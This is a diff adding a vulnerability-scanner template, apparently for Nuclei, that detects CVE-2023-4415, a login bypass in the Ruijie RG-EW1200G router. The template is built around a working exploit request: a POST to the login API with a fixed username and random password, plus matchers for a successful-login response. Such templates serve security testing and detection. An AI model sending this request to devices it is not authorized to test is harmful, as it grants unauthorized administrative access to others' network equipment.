@@ -1,0 +1,29 @@
+id: cve-2023-4415
+info:
+  name: Ruijie RG-EW1200G Login Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2023-4415,auth-bypass
+
+variables:
+  t1: "{{rand_int(100, 10000)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/sys/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"username":"2","password":"{{t1}}","timestamp":1698220385000}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"msg":"登入成功"'
+          - '"result":"ok"'
+          - '"dev_mode":"gateway"'
